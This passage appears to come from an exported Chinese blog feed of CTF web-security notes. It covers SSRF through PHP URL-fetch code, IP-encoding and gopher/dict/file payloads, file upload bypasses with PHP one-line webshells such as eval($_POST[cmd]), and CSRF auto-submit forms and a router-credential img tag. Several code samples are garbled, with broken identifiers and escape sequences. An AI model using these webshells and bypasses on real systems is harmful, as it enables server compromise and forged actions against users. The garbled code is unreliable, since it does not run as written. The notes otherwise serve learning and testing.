class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$link</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_ <span class="title function_ invoke__">init</span>(<span class="variable">$link</span>);</span><br><span class="line">    curl_ <span class="title function_ invoke__">setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_ <span class="title function_ invoke__">setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="variable">$result</span> = curl_ <span class="title function_ invoke__">exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    curl_ <span class="title function_ invoke__">close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-file-get-contents"><a href="#2-file-get-contents" class="headerlink" title="2.file_get_contents"></a>2.file_get_contents</h5><p>下面的代码使用file_get_contents函数，从用户指定url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_ <span class="title function_ invoke__">get_contents</span>(<span class="variable">$_</span> POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$img</span> = <span class="string">&quot;&lt;img src=l&quot;</span><span class="string">&quot;.<span class="subst">$filename</span>.&quot;</span>\<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="3fsockopen"><a href="#3fsockopen" class="headerlink" title="3fsockopen()"></a>3fsockopen()</h5><p>使用fsockopen函数实现获取用户制定url的数据(文件或者html)。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$fp</span> <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (l<span class="variable">$fp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$ermo</span>) In&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1lrin&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.= <span class="string">&quot;Host: <span class="subst">$hostirIn</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.= <span class="string">&quot;Connection: Closelrnrin&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.= <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        while (!feof(<span class="subst">$fp</span>))&#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$contents</span>.= fgets(<span class="subst">$fp</span>, 1024);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        fclose(<span class="subst">$fp</span>);</span></span><br><span class="line"><span class="string">        return <span class="subst">$contents</span>;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-curl-exec"><a href="#4-curl-exec" class="headerlink" title="4.curl exec()"></a>4.curl exec()</h5><p>使用curl发送请求获取数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="literal">TRUE</span>); <span class="literal">TRUE</span>将curl <span class="title function_ invoke__">exec</span>()获取的信息以字符串返回，而不是真接输出。</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled&#x27;</span>.rand.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, Sresult);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-SSRF限制绕过策略"><a href="#4-SSRF限制绕过策略" class="headerlink" title="4.SSRF限制绕过策略"></a>4.SSRF限制绕过策略</h2><p>研发人员限制SSRF请求的策略，基于正则表达式:</p><ul><li>限制对特定域名的访问请求</li><li>禁止请求内网IP地址</li></ul><h5 id="1-添加端口"><a href="#1-添加端口" class="headerlink" title="1.添加端口"></a>1.添加端口</h5><p>HTTP请求的URL中默认是以80端口访问。443</p><p><a href="http://127.0.0.1等价于http//127.0.0.1:80">http://127.0.0.1等价于http://127.0.0.1:80</a></p><p>以.号分割，结果分割部分[127,0,0,1:80] 那么最后一个部分显然不是数字，此时绕过IP地址限制。</p><h5 id="2-数制绕过"><a href="#2-数制绕过" class="headerlink" title="2.数制绕过"></a>2.数制绕过</h5><p>IP地址是32位二进制数据组成–&gt;4字节</p><p>目前看到的IP地址都是采用点分十进制组成的，例如: 127.0.0.1、192.168.0.1</p><p>127.0.0.1      01111110000000000000000001</p><p>011111000000000000000000转换为十进制2130706433 访问时浏览器自行转换为127.0.0.1</p><p>八进制    0177.00.00.01</p><p>十六进制   0x7f.0x0.0x0.0x1</p><h2 id="5-SSRF中可以使用的协议分析"><a href="#5-SSRF中可以使用的协议分析" class="headerlink" title="5.SSRF中可以使用的协议分析"></a>5.SSRF中可以使用的协议分析</h2><p>在SSRF中可以利用的协议包括file、dict、 gopher协议。</p><h5 id="1-file协议的使用"><a href="#1-file协议的使用" class="headerlink" title="1.file协议的使用"></a>1.file协议的使用</h5><p>file协议主要用于访问本地计算机中的文件，命令格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://文件路径</span><br></pre></td></tr></table></figure><p><img src="/imgs/ssrf2.jpg"></p><h5 id="2-dict协议的使用"><a href="#2-dict协议的使用" class="headerlink" title="2.dict协议的使用"></a>2.dict协议的使用</h5><p>利用dict协议可以探测端口的开放情况和指纹信息命令格式为: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/info</span><br></pre></td></tr></table></figure><p><img src="/imgs/ssrf3.jpg"></p><h5 id="3-gopher协议的使用"><a href="#3-gopher协议的使用" class="headerlink" title="3.gopher协议的使用"></a>3.gopher协议的使用</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet 上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet 上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。 但在WWW出现后，Gopher失去了昔日的辉煌。Gopher协议在SSRF中可以是一个万能协议，可以进行GET、POST请求的发送。</p><p>构造gopher数据:抓包后对整个数据包中的空格&#x3D; (%20)、问号? (%3f)进行URL编码。回车换行要变为%0d%0a， 最后一行也需要%0d%0a。</p><h6 id="GET请求测试代码"><a href="#GET请求测试代码" class="headerlink" title="GET请求测试代码:"></a>GET请求测试代码:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.$.GET[<span class="string">&quot;user&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>HTTP请求数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/browser/edge/navigate/3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>nav-edge.smartscreen.microsoft.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1566</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>SmartScreenHash eyJhdXRoSWQiOiIzODFkZGQxZS1lNjAwLTQyZGUtOTRlZC04YzM0YmY3M2YxNmQiLCAia2V5IjoiOXBhZzdKVFVIbzNUd3FicUNja0dqZz09IiwgImhhc2giOiJoMVpKRllvTHAwUT0ifQ==</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>no-cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端: curl gopher://IP:端口/_数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://127.0.0.1/_POST%20/api/browser/edge/navigate/3%20HTTP/1.1%0d%0aHost:%20nav-edge.smartscreen.microsoft.com%0d%0a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2023/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p>什么是webshell？<br>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p><p><strong>一句话木马</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_REQUEST</span>[cmd]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="上传漏洞绕过"><a href="#上传漏洞绕过" class="headerlink" title="上传漏洞绕过"></a>上传漏洞绕过</h2><h4 id="1-客服端绕过"><a href="#1-客服端绕过" class="headerlink" title="1.客服端绕过"></a>1.客服端绕过</h4><p>（1）客户端校验:</p><p>一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg&#x2F;.jpeg&#x2F;.png后缀名的文件，而此时并没有发送数据包。</p><p>（2）绕过方法:</p><p>1.通过禁用 JS 脚本；</p><p>2.通过删除 onsubmit&#x3D;”return checkFile()” </p><p>3.通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为asp&#x2F;php&#x2F;jsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改。</p><h4 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h4><h6 id="1-黑名单扩展名绕过"><a href="#1-黑名单扩展名绕过" class="headerlink" title="1.黑名单扩展名绕过"></a>1.黑名单扩展名绕过</h6><p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：（1）找黑名单扩展名的漏网之鱼 - 比如 iis6.0 中的 asa 和 cer （2）可能存在大小写绕过漏洞 - 比如 aSp(iis6.0 中可以）和 pHp（只能在 小于 php5.3.39 中的 linux 中）之中 （3）能被web容器解析的文件其他扩展名列表：</p><p>jsp, jspx ,jspf</p><p>asp asa cer cdx,htr,xml,html</p><p>aspx,ashx,asmx,asax,ascx</p><h6 id="2-黑名单特殊后缀名绕过"><a href="#2-黑名单特殊后缀名绕过" class="headerlink" title="2.黑名单特殊后缀名绕过"></a>2.黑名单特殊后缀名绕过</h6><p>将Burpsuite截获的数据包中backlion.php名字改为 baclion.php4(php1,php2,php3,php4,php5), 前提条件是 http.conf 中设置 AddType application&#x2F;x-httpd-php .php1(php 的版本小于等于 5.3.29 以下)</p><h6 id="3-单双重后缀名绕过"><a href="#3-单双重后缀名绕过" class="headerlink" title="3.单双重后缀名绕过"></a>3.单双重后缀名绕过</h6><p>上传时将 Burpsuite 截的数据包中文件名 backlion.php（backlion.asa)改 为 backlion.pphphph(backlion.asasaa)，那么过滤了第一个”php”字符串”后， 开头的’p’和结尾的’hp’就组合又形成了 php</p><h6 id="4-服务端-MIME-文件类型-Content-Type-绕过"><a href="#4-服务端-MIME-文件类型-Content-Type-绕过" class="headerlink" title="4.服务端 MIME 文件类型(Content-Type)绕过"></a>4.服务端 MIME 文件类型(Content-Type)绕过</h6><p>MIME 的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过 MIME 类 型来判断文件是GIF图片，还是可打印的 PostScript 文件。web服务器使用 MIME 来说明发送数据的种类，web客户端使用 MIME 来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式的重要标记项。</p><p>绕过方法：上传对文件类型做了限制，可通过 burpsuit 将其他类文件类型 修改为如：Content-Type：image&#x2F;gif 和 image&#x2F;jpeg 等运行的文件类型。</p><h4 id="3-白名单绕过："><a href="#3-白名单绕过：" class="headerlink" title="3.白名单绕过："></a>3.白名单绕过：</h4><h6 id="1-配合web容器的解析漏洞："><a href="#1-配合web容器的解析漏洞：" class="headerlink" title="1.配合web容器的解析漏洞："></a>1.配合web容器的解析漏洞：</h6><p><strong>IIS中的目录解析漏洞和分号解析漏洞</strong> ：将一句话木马的文件名 backlion.php，改成 backlion.php.abc(奇怪的不被解析的后缀名都 行)。首先， 服务器验证文件扩展名的时候，验证的是.abc，只要该扩展名符合服务器端黑白名单，即可上传。</p><p><strong>nginx 空字节漏洞</strong> xxx.jpg%00.php 这样的文件名会被解析为php代码运行。</p><p><strong>apache 的解析漏洞</strong>，上传如 a.php.rar a.php.gif 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的。</p><h6 id="2-00-截断上传绕过"><a href="#2-00-截断上传绕过" class="headerlink" title="2.%00 截断上传绕过"></a>2.%00 截断上传绕过</h6><p>通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg</p><h6 id="3-文件头内容检测绕过"><a href="#3-文件头内容检测绕过" class="headerlink" title="3.文件头内容检测绕过"></a>3.文件头内容检测绕过</h6><p>不同的图片文件都有不同文件头，如： PNG：文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识) GIF：文件头标识 (6 bytes) 47 49 46 38 39(37) 61 上传文件的时候会检查上传文件是否合法，如图片文件是否文件头含有 gif89, 这里可以通过一句话图片木马生成工具 edjpgcom 戒者通过编辑器在木马内容基础上再加了一些文件信息，有点像下面的结构:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-二次渲染绕过"><a href="#4-二次渲染绕过" class="headerlink" title="4.二次渲染绕过"></a>4.二次渲染绕过</h4><p>在制作图片马的时候，往往是在图片后头附件一段php代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p><p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。），用winhex或者是010editor等在文件内进行修改即可。</p><h4 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5.条件竞争"></a>5.条件竞争</h4><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站请求伪造</title>
      <link href="/2023/01/15/CSRF/"/>
      <url>/2023/01/15/CSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF-跨站请求伪造"></a>CSRF-跨站请求伪造</h1><h2 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h2><p>CSRF （ Cross-site request forgery ） 跨站请求伪造： 也被称为“ One Click Atack” 或者 Session Riding ， 通常缩写为 CSRF 或者 XSRF ， 是一种对网站的恶意利用。尽管听起来像跨站脚本（ XSS ） ， 但它与 XSS 非常不同， XSS 利用站点内的信任用户， 而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。</p><p>与 XSS 攻击相 比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范， 所以被认为比 XSS 更具危险性。 其实说白了， csrf 漏洞的成因就是网站的 cookie 在浏览器中不会过期， 只要不关闭浏览器或者退出登录，那以后只要是访问这个都网站，会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的 csrf 脚本或包含 csrf 脚本的链接， 可能会执行一些用户不想做的功能（比如是添加账号等）    js( 可以发送数据包 ) ajax</p><h2 id="2-CSRF原理"><a href="#2-CSRF原理" class="headerlink" title="2.CSRF原理"></a>2.CSRF原理</h2><p><img src="/imgs/1.jpg"></p><p> 《<a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a>》</p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><ol><li><p>登录受信任网站A，并在本地生成Cookie。</p></li><li><p>在不登出A的情况下，访问危险网站B。</p></li></ol><h2 id="3-几种攻击类型"><a href="#3-几种攻击类型" class="headerlink" title="3.几种攻击类型"></a>3.几种攻击类型</h2><h4 id="1-GET类型的CSRF"><a href="#1-GET类型的CSRF" class="headerlink" title="1.GET类型的CSRF"></a>1.GET类型的CSRF</h4><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求这种类型的CSRF一般是由于程序员安全意识不强造成的。构造GET型URL，提交username和password参数，以此来新建对应的用户名和密码</p><p>，一般会这样利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://wooyun.org/csrf?xx</span>=<span class="string">11</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>在访问含有这个img的页面后，成功向<a href="http://wooyun.org/csrf?xx=11">http://wooyun.org/csrf?xx=11</a> 发出了一次HTTP请求<br>所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了</p><h4 id="2-POST类型的CSRF"><a href="#2-POST类型的CSRF" class="headerlink" title="2.POST类型的CSRF"></a>2.POST类型的CSRF</h4><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><h4 id="3-过基础认证的CSRF-常用于路由器"><a href="#3-过基础认证的CSRF-常用于路由器" class="headerlink" title="3.过基础认证的CSRF(常用于路由器)"></a>3.过基础认证的CSRF(常用于路由器)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://admin:admin@192.168.1.1</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了</p><h4 id="4-未进行token校验"><a href="#4-未进行token校验" class="headerlink" title="4.未进行token校验"></a>4.未进行token校验</h4><p>没有csrf-token的校验是最经典的CSRF漏洞高发处，但是这种漏洞只有在一些高风险的位置才有价值，比如csdn上关注&#x2F;取关，发表博文等等一些操作，而在淘宝中如查看某一商品、执行某一模糊查询，这样的都属于无价值的被默认许可的csrf。</p><h2 id="4-CSRF漏洞探测自动化探测"><a href="#4-CSRF漏洞探测自动化探测" class="headerlink" title="4.CSRF漏洞探测自动化探测"></a>4.CSRF漏洞探测自动化探测</h2><h3 id="1-手动探测"><a href="#1-手动探测" class="headerlink" title="1.手动探测"></a>1.手动探测</h3><p>手动探测原理在于探测web应用具有防止CSRF的措施。</p><ul><li>二次验证：一般情况下使用js验证，但是是否执行成功取决于用户，不建议使用。</li><li>HTTP Referer头</li><li>是否设置Token</li><li>HTTP自定义头</li></ul><p>如果web应用程序的HTTP请求中没有对应的防御措施，那么很大程度上就确定存在CSRF漏洞。</p><h3 id="2-自动化探测工具"><a href="#2-自动化探测工具" class="headerlink" title="2.自动化探测工具"></a>2.自动化探测工具</h3><p>CSRFTest是一款CSRF漏洞的测试工具。</p><p>CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有连接以及表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也能用来进行CSRF攻击。</p><h2 id="5-CSRF漏洞Token防御"><a href="#5-CSRF漏洞Token防御" class="headerlink" title="5.CSRF漏洞Token防御"></a>5.CSRF漏洞Token防御</h2><h4 id="1-漏洞修补逻辑分析"><a href="#1-漏洞修补逻辑分析" class="headerlink" title="1.漏洞修补逻辑分析"></a>1.漏洞修补逻辑分析</h4><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。</p><p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作。</p><p>一般情况下，给予的令牌会写入表单中隐藏域的value值中，随着表单内容进行提交。</p><h4 id="2-简单代码模型分析"><a href="#2-简单代码模型分析" class="headerlink" 